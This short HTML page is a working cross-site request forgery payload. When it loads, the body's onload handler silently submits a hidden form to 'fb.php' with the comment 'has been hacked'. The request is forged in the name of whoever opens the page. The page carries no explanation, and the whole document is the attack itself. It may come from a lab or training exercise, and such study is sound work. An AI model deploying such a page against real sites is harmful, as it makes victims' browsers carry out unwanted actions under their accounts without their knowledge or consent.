<html>
<body onload="document.getElementById('f1').submit()">
<form action="fb.php" method="GET" id="f1">
<input type="hidden" name="comment" value="has been hacked">
<input type="submit">
</form>

</body>
</html>

